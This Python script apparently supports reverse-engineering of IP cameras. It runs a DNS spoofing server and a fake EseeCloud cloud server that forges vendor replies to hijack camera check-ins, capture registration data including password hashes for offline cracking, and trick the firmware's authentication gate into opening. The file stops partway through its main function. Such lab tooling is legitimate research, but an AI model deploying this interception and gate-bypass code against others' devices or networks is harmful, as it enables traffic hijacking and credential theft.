#!/usr/bin/env python3
"""
eseecloud-dns-server.py — DNS interceptor + fake EseeCloud server.

Runs an async DNS server that intercepts queries for EseeCloud-related
domains and resolves them to our own IP, forwarding all other queries to a
real upstream DNS. Simultaneously listens on known EseeCloud TCP ports and
logs every byte of protocol data with timestamps and hex dumps.

USAGE:
  sudo python3 scripts/eseecloud-dns-server.py \
      --our-ip 10.0.0.149 \
      --dns-port 5353 \
      --upstream 8.8.8.8 \
      --log-dir captures/eseecloud-dns-10.0.0.227-20260101T120000Z/

The DNS server listens on --dns-port (default 5353). Use iptables to
redirect camera DNS traffic to this port:

  iptables -t nat -A PREROUTING -s <camera-ip> -p udp --dport 53 \
      -j REDIRECT --to-port 5353

EseeCloud domains intercepted:
  *.eseecloud.com   *.xmeye.net        *.yoosee.co
  *.cloudeye.co     *.ipc365.com       *.nvrcam.com
  Also intercepts DNS-API P2P bootstrap queries by common pattern.

Fake servers listen on a configurable set of ports (defaults cover the
most common EseeCloud/XMEye/CloudEye P2P and registration ports).

DEPENDENCIES: Python 3.7+ with asyncio. No external packages.
"""

import argparse
import asyncio
import json
import os
import random
import re
import socket
import struct
import sys
import time
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import unquote_plus


# /address/device returns the 10-digit Esee/P2P ID embedded at the end of
# the camera serial. pconv is the same ID without its final two digits.
# tconv is NOT serial-derived: packet captures show it changing for repeated
# requests from the same camera (2085623285 / 131279872 / 1247539048). The
# forge now emits a fresh random tconv per request to mirror the real server;
# this constant remains only as a documented legacy fallback.
DEFAULT_DISCOVERY_TCONV = 1247539048
DEFAULT_DISCOVERY_ID = "4781620744"
DEFAULT_DISCOVERY_PCONV = 47816207

# stun.ipv4 is a CONSTANT shared relay-side STUN server (14.17.121.21 observed
# in every real reply regardless of camera), while ipv4 is the per-camera P2P
# relay and ipv6 is that relay's IPv6 address. The camera reads stun == relay
# as "not the real distributed cloud" and downgrades to the never-adopted
# HTTP-upgrade LITE check-in — so stun MUST differ from ipv4. Relay IPv6
# addresses observed in real replies (20260808T053714Z for 129.153.101.14,
# 20260808T050802Z/053046Z for 172.235.43.92):
RELAY_IPV6 = {
    "129.153.101.14": "2603:c020:10:8100:e25f:dc8f:1c1e:a08d",
    "172.235.43.92": "2a01:7e03::2000:5ff:fe28:6119",
}
DEFAULT_RELAY_IPV6 = "2a01:7e03::2000:5ff:fe28:6119"


def derive_discovery_identity(request_body: bytes) -> tuple[int, str]:
    """Derive ``pconv`` and ``id`` from an /address/device request body.

    5523-W requests carry ``sn=<vendor-prefix><10-digit-esee-id>``. The
    captured real replies confirm that ``id`` is those final ten digits and
    ``pconv`` is the first eight digits of that ID. Keep the old observed
    device as a fallback for malformed/legacy requests so discovery remains
    compatible with captures that omit ``sn``.
    """
    match = re.search(rb"(?:^|&)sn=([^&\s]+)", request_body)
    serial = unquote_plus(match.group(1).decode("ascii", errors="ignore")) if match else ""
    id_match = re.search(r"(\d{10})$", serial)
    if not id_match:
        return DEFAULT_DISCOVERY_PCONV, DEFAULT_DISCOVERY_ID
    camera_id = id_match.group(1)
    return int(camera_id[:-2]), camera_id


# ═══════════════════════════════════════════════════════════════════════════
# DNS PROTOCOL CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════

DNS_QR_QUERY = 0
DNS_QR_RESPONSE = 1
DNS_TYPE_A = 1
DNS_CLASS_IN = 1

# Known EseeCloud/XMEye/CloudEye domains — any subdomain of these gets
# redirected to our IP so the camera talks to our fake server.
ESEECLOUD_SUFFIXES = [
    "eseecloud.com",
    "xmeye.net",
    "xmeye.com",
    "yoosee.co",
    "cloudeye.co",
    "ipc365.com",
    "nvrcam.com",
    "gwell.cc",
    "macscam.com",
    "seetong.com",
    "vstarcam.com",
    "eye4.cn",
    "pushtech.com",
    "cloudlinks.com",
    "dvr163.com",   # ngw.dvr163.com / pm.dvr163.com — 5523-W discovery + P2P
]

# Additional exact-match DNS names that cameras use for P2P bootstrap
ESEECLOUD_EXACT = [
    "dns.eseecloud.com",
    "p2p.eseecloud.com",
    "cloud.eseecloud.com",
    "api.eseecloud.com",
    "checkin.eseecloud.com",
    "register.eseecloud.com",
    "relay.eseecloud.com",
]


def is_eseecloud_domain(qname: str) -> bool:
    """Check if a DNS query name is EseeCloud-related."""
    lower = qname.lower().rstrip(".")
    if lower in ESEECLOUD_EXACT:
        return True
    for suffix in ESEECLOUD_SUFFIXES:
        if lower == suffix or lower.endswith("." + suffix):
            return True
    return False


# ═══════════════════════════════════════════════════════════════════════════
# DNS SERVER
# ═══════════════════════════════════════════════════════════════════════════

class DnsInterceptor:
    """
    Async DNS server that intercepts EseeCloud queries and forwards others.
    """

    def __init__(self, our_ip: str, listen_port: int, upstream_dns: str,
                 log_dir: str):
        self.our_ip = our_ip
        self.listen_port = listen_port
        self.upstream_dns = upstream_dns
        self.log_dir = log_dir
        self.transport: Optional[asyncio.DatagramTransport] = None
        self.query_log_path = os.path.join(log_dir, "dns-queries.log")

    async def start(self):
        """Start the DNS listener."""
        loop = asyncio.get_event_loop()
        self.transport, _ = await loop.create_datagram_endpoint(
            lambda: _DnsProtocol(self),
            local_addr=("0.0.0.0", self.listen_port),
        )
        with open(self.query_log_path, "a") as f:
            f.write(f"# DNS interceptor started at {datetime.now(timezone.utc).isoformat()}\n")
            f.write(f"# Listening on 0.0.0.0:{self.listen_port}\n")
            f.write(f"# Upstream: {self.upstream_dns}\n")
            f.write(f"# Our IP: {self.our_ip}\n\n")
        print(f"  DNS interceptor listening on 0.0.0.0:{self.listen_port}")
        print(f"    Upstream: {self.upstream_dns}")

    def stop(self):
        """Stop the DNS listener."""
        if self.transport:
            self.transport.close()

    def handle_query(self, data: bytes, addr: tuple) -> Optional[bytes]:
        """Process a DNS query. Returns response bytes or None to forward."""
        try:
            questions = _parse_dns_query(data)
        except (IndexError, struct.error):
            return None

        for qname, qtype, qclass in questions:
            if is_eseecloud_domain(qname):
                response = _build_dns_response(data, self.our_ip)
                self._log_query(addr, qname, "REDIRECT", self.our_ip)
                return response

        # Forward to upstream
        self._log_query(addr, questions[0][0] if questions else "?", "FORWARD", self.upstream_dns)
        return None  # caller should forward

    def _log_query(self, addr: tuple, qname: str, action: str, target: str):
        """Log a DNS query to the log file."""
        ts = datetime.now(timezone.utc).isoformat()
        line = f"{ts} {addr[0]}:{addr[1]} {action:8s} {qname:40s} → {target}\n"
        with open(self.query_log_path, "a") as f:
            f.write(line)


class _DnsProtocol(asyncio.DatagramProtocol):
    """asyncio DatagramProtocol wrapping DnsInterceptor."""

    def __init__(self, interceptor: DnsInterceptor):
        self.interceptor = interceptor
        self.transport: Optional[asyncio.DatagramTransport] = None

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        response = self.interceptor.handle_query(data, addr)
        if response and self.transport:
            self.transport.sendto(response, addr)
        elif not response:
            # Forward to upstream DNS
            asyncio.create_task(
                self._forward_and_reply(data, addr)
            )

    async def _forward_and_reply(self, data: bytes, addr: tuple):
        """Forward query to upstream DNS and relay response."""
        sock = None
        try:
            upstream_addr = (self.interceptor.upstream_dns, 53)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(data, upstream_addr)
            response, _ = sock.recvfrom(4096)
            if self.transport:
                self.transport.sendto(response, addr)
        except Exception as e:
            print(f"  DNS forward error: {e}", file=sys.stderr)
        finally:
            if sock:
                sock.close()


def _parse_dns_query(data: bytes) -> list[tuple[str, int, int]]:
    """Parse DNS query questions. Returns list of (qname, qtype, qclass)."""
    # Skip 12-byte header
    pos = 12
    questions = []
    qdcount = struct.unpack("!H", data[4:6])[0]

    for _ in range(qdcount):
        # Decode name
        name_parts = []
        while pos < len(data):
            length = data[pos]
            if length == 0:
                pos += 1
                break
            if length & 0xC0 == 0xC0:
                # Compression pointer — we just skip for simple queries
                pos += 2
                break
            pos += 1
            name_parts.append(data[pos:pos + length].decode("ascii", errors="replace"))
            pos += length

        qname = ".".join(name_parts)
        if pos + 4 <= len(data):
            qtype = struct.unpack("!H", data[pos:pos + 2])[0]
            qclass = struct.unpack("!H", data[pos + 2:pos + 4])[0]
            pos += 4
            questions.append((qname, qtype, qclass))

    return questions


def _build_dns_response(query: bytes, answer_ip: str) -> Optional[bytes]:
    """Build a minimal DNS A-record response for a query."""
    if len(query) < 12:
        return None  # truncated query

    # Copy header from query, modify flags for response
    response = bytearray(query[:2])  # transaction ID
    response.extend(b"\x81\x80")    # flags: response, no error
    response.extend(query[4:6])     # QDCOUNT (same as query)
    response.extend(b"\x00\x01")    # ANCOUNT = 1
    response.extend(b"\x00\x00")    # NSCOUNT = 0
    response.extend(b"\x00\x00")    # ARCOUNT = 0

    # Copy the question section verbatim (starts at byte 12)
    # Find end of question section — with bounds protection
    pos = 12
    while pos < len(query):
        # Guard: label length byte might jump past the end
        if pos >= len(query):
            break
        label_len = query[pos]
        if label_len == 0:
            pos += 5  # null byte + QTYPE + QCLASS
            break
        if label_len & 0xC0 == 0xC0:
            pos += 2 + 4  # pointer + QTYPE + QCLASS
            break
        pos += label_len + 1  # label length + label
        if pos > len(query):  # malformed — don't crash
            return None
    question_section = query[12:min(pos, len(query))]
    response.extend(question_section)

    # Answer section: name pointer + type A + class IN + TTL + IPv4
    response.extend(b"\xc0\x0c")  # name pointer to question
    response.extend(b"\x00\x01")  # type A
    response.extend(b"\x00\x01")  # class IN
    response.extend(b"\x00\x00\x00\x3c")  # TTL = 60s
    response.extend(b"\x00\x04")  # RDLENGTH = 4

    # Encode IP address
    for octet in answer_ip.split("."):
        response.append(int(octet))

    return bytes(response)


# ═══════════════════════════════════════════════════════════════════════════
# FAKE ESEECLOUD TCP SERVER
# ═══════════════════════════════════════════════════════════════════════════

# Default ports to listen on — covers EseeCloud/XMEye P2P, registration,
# media relay, and common device management ports.
DEFAULT_ESEECLOUD_PORTS = [
    8800,    # Primary EseeCloud registration/check-in port
    35000,   # Secondary cloud port
    37777,   # XMEye P2P registration
    37778,   # XMEye media/data
    34567,   # Cloud relay
    15001,   # Alternate P2P
    15002,   # Alternate P2P data
    18004,   # CloudEye
    34569,   # Variant registration
    10080,   # HTTP-proxied cloud
    20000,   # Common fallback
    25000,   # Common fallback
]


class FakeEseeCloudServer:
    """
    Async TCP server that accepts connections on EseeCloud ports and logs
    all received data with timestamps and hex dumps. Optionally sends an ACK
    byte to keep cameras from disconnecting (disabled by default since it
    injects data into the protocol stream).
    """

    # Real ngw.dvr163.com response observed live for a 5523-W (2026-08-08).
    # The camera POSTs /address/device?sn=<serial>&max_ch=1 and the server
    # replies with JSON telling it which P2P server to check in with. We forge
    # this with OUR IP so the camera's registration (which carries the
    # password hash) flows to our WS server on :19000.
    #   {"ipv4":"172.235.43.92","ipv6":"2a01:7e03::2000:5ff:fe28:6119",
    #    "udpport":"19000","tcpport":"19000","sslport":19001,
    #    "pconv":47816207,"id":"4781620744","tconv":1247539048,
    #    "stun":{"ipv4":"14.17.121.21","ipv6":"::1","port":"3478"},
    #    "random":"75279549","forcetcp":1}
    # For 10.0.0.29's JAZ7C34780038910, the real reply instead carries
    # pconv=47800389 and id=4780038910. The first two fields are derived per
    # request below; tconv is deliberately not guessed from the serial.
    DISCOVERY_FORGE_PORTS = {80}  # ngw.dvr163.com discovery is plain HTTP on :80

    def __init__(self, ports: list[int], log_dir: str, ack_byte: str = "",
                 our_ip: str = "10.0.0.149", message_reply_mode: int = -1,
                 p2p_ip: str = "129.153.101.14", stun_ip: str = "14.17.121.21"):
        self.ports = ports
        self.log_dir = log_dir
        self.ack_byte = ack_byte
        self.ack_bytes = bytes.fromhex(ack_byte) if ack_byte else b""
        self.our_ip = our_ip
        self.p2p_ip = p2p_ip
        self.stun_ip = stun_ip
        self.message_reply_mode = message_reply_mode  # -1 = rotate candidates
        self._message_reply_index = 0
        self.servers: list[asyncio.AbstractServer] = []
        self.connections_log_path = os.path.join(log_dir, "eseecloud-connections.log")
        self.data_log_path = os.path.join(log_dir, "eseecloud-data.bin")

    def _forge_discovery_response(self, request_body: bytes) -> bytes:
        """Build a forged ngw.dvr163.com /address/device reply.

        Echoes the camera's r=<random> nonce (the real server does this) and
        returns a P2P server the camera checks in with. CRITICAL (learned from
        the real-cloud captures 20260808T050802Z/053046Z): the camera behaves
        DIFFERENTLY based on the IP it dials —

          * real public P2P IP (129.153.101.14 / 172.235.43.92): RAW WebSocket
            frames, no HTTP upgrade, and it sends hello cefaeffe + FULL 0x11
            (serial embedded) back-to-back, UNPROMPTED, every ~10s. These are
            the registrations the real server grants and the camera adopts.
          * OUR private IP: HTTP-upgrade WebSocket, LITE 0x00 only — grants to
            that form were NEVER adopted and the gate stayed closed.

        So the forge returns a REAL public P2P IP (--p2p-ip), NOT our own IP:
        the camera then dials that public IP with the RAW-WS FULL behavior,
        and the capture script's dest-based iptables REDIRECT lands the
        connection on our local :19000 ws-server anyway. Returning our own IP
        made the camera downgrade to LITE, which is why every MITM run saw
        LITE-only traffic.

        SECOND discriminator (decoded byte-exact from real replies,
        20260808T053714Z/050802Z): stun.ipv4 must be a DIFFERENT public IP
        than ipv4. The real server always returns the constant 14.17.121.21
        there while ipv4 varies per camera; when stun.ipv4 == ipv4 the camera
        treats the reply as a fake/proxied cloud and falls back to the
        HTTP-upgrade d9ffcc-probe LITE 0x00 path (never adopted). The forge
        emits self.stun_ip (--stun-ip, default 14.17.121.21) accordingly.
        ipv6 is the RELAY's address (per-ipv4 mapping in RELAY_IPV6), not a
        per-camera value.
        """
        r = "0"
        m = re.search(rb"(?:^|&)r=([0-9]+)", request_body)
        if m:
            r = m.group(1).decode("ascii")
        pconv, camera_id = derive_discovery_identity(request_body)
        payload = {
            "ipv4": self.p2p_ip,
            "ipv6": RELAY_IPV6.get(self.p2p_ip, DEFAULT_RELAY_IPV6),
            "udpport": "19000",
            "tcpport": "19000",
            "sslport": 19001,
            "pconv": pconv,
            "id": camera_id,
            # The real server issues a FRESH per-request tconv (captures show
            # 2085623285 / 131279872 / 1247539048 for the same camera across
            # requests). A constant value may keep the camera from advancing
            # to the account-level check-in, so emit a random value capped at
            # 2**31-1 (the camera likely parses tconv as a signed 32-bit int;
            # all captured real values are below 2147483647).
            "tconv": random.randint(100000000, 2147483647),
            "stun": {"ipv4": self.stun_ip, "ipv6": "::1", "port": "3478"},
            "random": r,
            "forcetcp": 1,
        }
        body = json.dumps(payload, separators=(",", ":")).encode("ascii")
        return (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/json\r\n"
            + f"Content-Length: {len(body)}\r\n".encode("ascii")
            + b"Connection: close\r\n"
            + b"\r\n"
            + body
        )

    def _forge_nonce_response(self) -> bytes:
        """Build a forged pm.dvr163.com /message/nonce reply.

        The camera GETs /message/nonce?method=get from pm.dvr163.com before
        checking in; the real reply was captured live (2026-08-08T05:09:55Z):

            HTTP/1.1 200 OK
            Content-Type: application/json,charset=utf-8
            Content-Length: 81
            Set-Cookie: PHPSESSID=202608080509552747802; path=/
            {"request_id":"202608080509552747802",
             "nonce":"bbeb66fc651e2d37a9c80ec56efaea1a"}

        request_id = YYYYMMDDHHMMSS + 7 random digits; nonce = 32 hex chars.
        The camera retries the GET every ~10s when unanswered (run #2), so
        answering is required for the check-in to advance.
        """
        now = datetime.now(timezone.utc)
        request_id = now.strftime("%Y%m%d%H%M%S") + "".join(
            random.choices("0123456789", k=7))
        nonce = "".join(random.choices("0123456789abcdef", k=32))
        body = json.dumps({"request_id": request_id, "nonce": nonce},
                          separators=(",", ":")).encode("ascii")
        with open(self.connections_log_path, "a") as f:
            f.write(f"{datetime.now(timezone.utc).isoformat()} NONCE_FORGED "
                    f"request_id={request_id} nonce={nonce}\n")
        return (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/json,charset=utf-8\r\n"
            + f"Content-Length: {len(body)}\r\n".encode("ascii")
            + b"Connection: keep-alive\r\n"
            + f"Set-Cookie: PHPSESSID={request_id}; path=/\r\n".encode("ascii")
            + b"Access-Control-Allow-Origin: *\r\n"
            + b"\r\n"
            + body
        )

    # Candidate success bodies for POST /message/message?method=post_v2 — the
    # camera's account-level check-in. The real cloud REJECTS it with
    # error:3004 "no user to push" (dead account binding), so $.Auth.ticket
    # is never set and /user/*.xml stays gated ("check in falied"). We answer
    # it ourselves. The exact success shape was never captured for this
    # family, so we rotate through plausible shapes; the live gate probe
    # (scripts/eseecloud-gate-probe.sh) identifies the winner.
    MESSAGE_SUCCESS_CANDIDATES = [
        '{{"request_id":"{rid}","error":0,"msg":"success"}}',
        '{{"request_id":"{rid}","error":0,"error_description":"ok","msg":"success"}}',
        '{{"request_id":"{rid}","code":0,"msg":"success"}}',
        '{{"request_id":"{rid}","code":200,"msg":"success"}}',
        '{{"request_id":"{rid}","ret":0,"msg":"success"}}',
        '{{"request_id":"{rid}","success":true,"msg":"success"}}',
        '{{"request_id":"{rid}","result":"ok"}}',
        '{{"request_id":"{rid}"}}',
        '{{"error":0,"msg":"success"}}',
        '',  # empty 200 body
        '{{"request_id":"{rid}","error":0,"error_description":"success","msg":"push ok"}}',
        '{{"request_id":"{rid}","push":[],"msg":""}}',
        '{{"request_id":"{rid}","code":0,"error_description":"success","msg":""}}',
    ]

    # Candidate success bodies for GET /message/sts?method=token — the camera's
    # message-token acquisition step (called by oc_get_message_token after it
    # fetches a nonce and computes verify). The real cloud never answered this
    # in any capture (the post_v2 500 error blocked the path first), so the
    # exact JSON shape was never seen. oc_get_message_token_from_json parses a
    # token from the response; on success it sets the camera's token-valid flag
    # (param_5[1]=1), which the gatekeeper FUN_002442a4 checks before allowing
    # KP2P_CloudMessagePush to proceed. Each reply reuses the request_id to
    # link it back to the matching /message/nonce cycle.
    # Candidate reply for GET /PushStsDns.php — the camera queries this
    # hardcoded cloud IP (47.74.237.147) after token acquisition to discover
    # the push notification server. The real reply returns a push-server IP
    # and port; we return our own IP on port 8800 (already in our listener
    # list) so the camera's subsequent push registration flows to us.
    PUSH_DNS_REPLY_FORMATS = [
        '{{"ip":"{ip}","port":8800}}',
        '{{"ip":"{ip}","port":"8800"}}',
        '{{"ip":"{ip}","port":8800,"tcp_port":8800}}',
    ]
    STS_TOKEN_CANDIDATES = [
        '{{"request_id":"{rid}","error":0,"token":"{token}"}}',
        '{{"request_id":"{rid}","error":0,"error_description":"ok","token":"{token}"}}',
        '{{"request_id":"{rid}","code":0,"token":"{token}"}}',
        '{{"request_id":"{rid}","ret":0,"token":"{token}"}}',
        '{{"error":0,"token":"{token}"}}',
        '{{"request_id":"{rid}","token":"{token}"}}',
        '{{"request_id":"{rid}","error":0,"msg":"ok","token":"{token}"}}',
    ]

    def _forge_sts_response(self, request_line: str) -> bytes:
        """Forge a pm.dvr163.com GET /message/sts?method=token success reply.

        The firmware's oc_get_message_token calls GET /message/nonce, computes
        verify, then calls GET /message/sts?method=token&request_id=…&verify=…
        &type=1 and parses the JSON with oc_get_message_token_from_json. On
        success the token-valid flag gets set (param_5[1]=1), which the
        gatekeeper FUN_002442a4 checks before allowing push messages to flow.

        Because the real server never answered this in any capture (the 05:08Z
        post_v2 500 error blocked it first), we rotate through plausible JSON
        shapes. The forged token is a random 32-hex string — the camera stores
        it as an opaque blob and sends it back in subsequent push headers.
        """
        rid = ""
        m = re.search(r"request_id=([0-9]+)", request_line)
        if m:
            rid = m.group(1)
        token = "".join(random.choices("0123456789abcdef", k=32))
        cands = self.STS_TOKEN_CANDIDATES
        if self.message_reply_mode is not None and self.message_reply_mode >= 0:
            mode = min(self.message_reply_mode, len(cands) - 1)
        else:
            mode = self._message_reply_index % len(cands)
            self._message_reply_index += 1
        body = cands[mode].format(rid=rid, token=token).encode("utf-8")
        print(f"  [ESEE :80] FORGED /message/sts reply (candidate #{mode})")
        with open(self.connections_log_path, "a") as f:
            f.write(f"{datetime.now(timezone.utc).isoformat()} STS_FORGED "
                    f"request_id={rid} token={token} "
                    f"request_line={request_line[:240]!r}\n")
        return (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/json,charset=utf-8\r\n"
            + f"Content-Length: {len(body)}\r\n".encode("ascii")
            + b"Connection: keep-alive\r\n"
            + (f"Set-Cookie: PHPSESSID={rid}; path=/\r\n".encode("ascii") if rid else b"")
            + b"Access-Control-Allow-Origin: *\r\n"
            + b"\r\n"
            + body
        )

    def _forge_message_response(self, request_line: str,
                                request_body: bytes) -> bytes:
        """Forge a pm.dvr163.com /message/message success reply.

        The camera POSTs its account check-in every ~20s using the request_id
        from our forged /message/nonce reply. mode -1 rotates through the
        candidate bodies; mode >= 0 pins one candidate for a clean follow-up
        run. The full query string (incl. the verify hash) is logged for
        offline formula cracking against the nonce we issued.
        """
        rid = ""
        m = re.search(r"request_id=([0-9]+)", request_line)
        if m:
            rid = m.group(1)
        cands = self.MESSAGE_SUCCESS_CANDIDATES
        if self.message_reply_mode is not None and self.message_reply_mode >= 0:
            mode = min(self.message_reply_mode, len(cands) - 1)
        else:
            mode = self._message_reply_index % len(cands)
            self._message_reply_index += 1
        body = cands[mode].format(rid=rid).encode("utf-8")
        print(f"  [ESEE :80] FORGED /message/message reply (candidate #{mode})")
        with open(self.connections_log_path, "a") as f:
            f.write(f"{datetime.now(timezone.utc).isoformat()} MESSAGE_POST "
                    f"request_line={request_line[:240]!r} mode={mode} "
                    f"body={request_body[:120]!r}\n")
        return (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/json,charset=utf-8\r\n"
            + f"Content-Length: {len(body)}\r\n".encode("ascii")
            + b"Connection: close\r\n"
            + (f"Set-Cookie: PHPSESSID={rid}; path=/\r\n".encode("ascii") if rid else b"")
            + b"Access-Control-Allow-Origin: *\r\n"
            + b"\r\n"
            + body
        )

    def _try_handle_discovery(self, buf: bytes, port: int,
                              writer: asyncio.StreamWriter) -> Optional[bytes]:
        """If buf is a complete /address/device POST or /message/nonce GET,
        forge the reply.

        Returns the bytes consumed from buf (headers + body) when handled,
        else None. The forged HTTP response is written to the client.
        """
        if port not in self.DISCOVERY_FORGE_PORTS:
            return None
        head_end = buf.find(b"\r\n\r\n")
        if head_end == -1:
            return None  # headers not complete yet
        headers = buf[:head_end].decode("latin-1", errors="replace")
        if headers.startswith("GET") and "/message/nonce" in headers:
            response = self._forge_nonce_response()
            print(f"  [ESEE :{port}] FORGED /message/nonce reply")
            with open(self.connections_log_path, "a") as f:
                f.write(f"{datetime.now(timezone.utc).isoformat()} FORGE port={port} "
                        f"NONCE len={len(response)} hex={response[:80].hex()}\n")
            writer.write(response)
            return head_end + 4  # GET has no body
        # GET /message/sts?method=token — the message-token acquisition step.
        # The firmware's oc_get_message_token calls this after /message/nonce
        # to get a session token; our forged reply sets the token-valid flag so
        # the push gatekeeper (FUN_002442a4) allows KP2P_CloudMessagePush.
        if headers.startswith("GET") and "/message/sts" in headers:
            request_line = headers.split("\r\n")[0]
            response = self._forge_sts_response(request_line)
            writer.write(response)
            return head_end + 4  # GET has no body
        # GET /PushStsDns.php — push notification server DNS lookup. Post-token
        # the camera hits a hardcoded Alibaba Cloud IP (47.74.237.147) with
        # this path; our iptables redirect captures it to us. Answer with our
        # own IP so the camera connects to us for push registration.
        if headers.startswith("GET") and "/PushStsDns.php" in headers:
            idx = self._message_reply_index % len(self.PUSH_DNS_REPLY_FORMATS)
            self._message_reply_index += 1
            body = self.PUSH_DNS_REPLY_FORMATS[idx].format(ip=self.our_ip).encode("utf-8")
            print(f"  [ESEE :80] FORGED /PushStsDns.php reply -> our IP")
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/json,charset=utf-8\r\n"
                + f"Content-Length: {len(body)}\r\n".encode("ascii")
                + b"Connection: keep-alive\r\n"
                + b"Access-Control-Allow-Origin: *\r\n"
                + b"\r\n"
                + body
            )
            writer.write(response)
            return head_end + 4  # GET has no body
        # POST /message/message — the camera's account-level check-in. Answer
        # with a forged success so $.Auth.ticket gets set and the /user/*.xml
        # gate opens.
        if headers.startswith("POST") and "/message/message" in headers:
            m = re.search(r"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
            if not m or not m.group(1).isdigit():
                return None
            content_length = int(m.group(1))
            body_start = head_end + 4
            if len(buf) < body_start + content_length:
                return None  # body not fully arrived yet
            body = buf[body_start:body_start + content_length]
            consumed = body_start + content_length
            request_line = headers.split("\r\n")[0]
            response = self._forge_message_response(request_line, body)
            writer.write(response)
            return consumed
        if not (headers.startswith("POST") and "/address/device" in headers):
            return None
        m = re.search(r"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
        if not m or not m.group(1).isdigit():
            return None
        content_length = int(m.group(1))
        body_start = head_end + 4
        if len(buf) < body_start + content_length:
            return None  # body not fully arrived yet
        body = buf[body_start:body_start + content_length]
        consumed = body_start + content_length
        response = self._forge_discovery_response(body)
        print(f"  [ESEE :{port}] FORGED /address/device reply -> "
              f"{self.p2p_ip}:19000 (r={body[-32:].decode('latin-1', errors='replace')[-16:]!r})")
        with open(self.connections_log_path, "a") as f:
            f.write(f"{datetime.now(timezone.utc).isoformat()} FORGE port={port} "
                    f"len={len(response)} hex={response[:80].hex()}\n")
        writer.write(response)
        return consumed

    async def start(self):
        """Start TCP servers on all specified ports."""
        for port in self.ports:
            try:
                server = await asyncio.start_server(
                    lambda r, w: self._handle_client(r, w, port),
                    host="0.0.0.0",
                    port=port,
                )
                self.servers.append(server)
                print(f"  Fake EseeCloud server listening on TCP :{port}")
            except OSError as e:
                print(f"  WARNING: Cannot bind port {port}: {e}", file=sys.stderr)

        with open(self.connections_log_path, "a") as f:
            f.write(f"# Fake EseeCloud server started at {datetime.now(timezone.utc).isoformat()}\n")
            f.write(f"# Listening on ports: {self.ports}\n\n")

        if not self.servers:
            print("  WARNING: No TCP servers could be started!", file=sys.stderr)

    def stop(self):
        """Stop all TCP servers."""
        for s in self.servers:
            s.close()

    async def _handle_client(self, reader: asyncio.StreamReader,
                              writer: asyncio.StreamWriter, port: int):
        """Handle a single client connection."""
        addr = writer.get_extra_info("peername")
        conn_ts = datetime.now(timezone.utc)
        conn_ts_str = conn_ts.isoformat()

        # Log connection
        conn_msg = f"{conn_ts_str} CONNECT {addr[0]}:{addr[1]} -> :{port}\n"
        print(f"  [ESEE] {conn_msg.strip()}")
        with open(self.connections_log_path, "a") as f:
            f.write(conn_msg)

        total_bytes = 0
        buf = b""  # accumulate for HTTP discovery forging
        try:
            # Send ACK byte only if configured (empty by default to avoid
            # injecting data into the captured protocol stream).
            if self.ack_bytes:
                writer.write(self.ack_bytes)
                await writer.drain()

            while True:
                try:
                    data = await asyncio.wait_for(reader.read(4096), timeout=30.0)
                except asyncio.TimeoutError:
                    break

                if not data:
                    break

                total_bytes += len(data)
                recv_ts = datetime.now(timezone.utc)
                recv_ts_str = recv_ts.isoformat()

                # Log to text log
                with open(self.connections_log_path, "a") as f:
                    f.write(f"{recv_ts_str} DATA port={port} len={len(data)} "
                            f"hex={data[:64].hex()}\n")

                # Append raw data to binary log (use receive timestamp, not connection time)
                with open(self.data_log_path, "ab") as f:
                    f.write(struct.pack("!Q", int(recv_ts.timestamp() * 1_000_000)))
                    f.write(struct.pack("!I", port))
                    f.write(struct.pack("!I", len(data)))
                    f.write(data)

                # Print hex dump to console
                print(f"  [ESEE :{port}] RECV {len(data)} bytes from {addr[0]}:{addr[1]}")
                _print_hex_dump_compact(data)

                # Forge ngw.dvr163.com /address/device reply on :80 so the
                # camera checks in with OUR P2P server instead of the real
                # cloud. After replying, stop reading (Connection: close).
                buf += data
                consumed = self._try_handle_discovery(buf, port, writer)
                if consumed is not None:
                    await writer.drain()
                    break  # finally block closes the writer

                # Send another ACK if configured
                if self.ack_bytes:
                    writer.write(self.ack_bytes)
                    await writer.drain()

        except (ConnectionResetError, BrokenPipeError, OSError):
            pass
        finally:
            # Log disconnect
            disc_ts = datetime.now(timezone.utc).isoformat()
            disc_msg = f"{disc_ts} DISCONNECT {addr[0]}:{addr[1]} "
            disc_msg += f"port={port} total_bytes={total_bytes} "
            disc_msg += f"duration={(datetime.now(timezone.utc) - conn_ts).total_seconds():.2f}s\n"
            print(f"  [ESEE] {disc_msg.strip()}")
            with open(self.connections_log_path, "a") as f:
                f.write(disc_msg)
                f.write("\n")  # blank line between connections

            try:
                writer.close()
                await writer.wait_closed()
            except OSError:
                pass


# ═══════════════════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════════════════

def _print_hex_dump_compact(data: bytes, max_bytes: int = 128):
    """Print a compact hex+ASCII dump of the first max_bytes."""
    display = data[:max_bytes]
    for offset in range(0, len(display), 16):
        chunk = display[offset:offset + 16]
        hex_str = " ".join(f"{b:02x}" for b in chunk)
        ascii_str = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"    {offset:04x}  {hex_str:<48s}  |{ascii_str}|")
    if len(data) > max_bytes:
        print(f"    ... ({len(data) - max_bytes} more bytes)")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

async def main_async(args):
    """Run DNS interceptor and fake EseeCloud servers concurrently."""
    os.makedirs(args.log_dir, exist_ok=True)

    dns = DnsInterceptor(
        our_ip=args.our_ip,
        listen_port=args.dns_port,
        upstream_dns=args.upstream,
        log_dir=args.log_dir,
    )

    fake_server = FakeEseeCloudServer(
        ports=args.ports,
        log_dir=args.log_dir,
        ack_byte=args.ack_byte,
        our_ip=args.our_ip,
        message_reply_mode=args.message_reply_mode,
        p2p_ip=args.p2p_ip,
        stun_ip=args.stun_ip,
    )

    print("=" * 60)
    print("  EseeCloud DNS Interceptor + Fake Server")
    print("=" * 60)
    print(f"  Our IP:        {args.our_ip}")
    print(f"  DNS port:      {args.dns_port}")
    print(f"  Upstream DNS:  {args.upstream}")
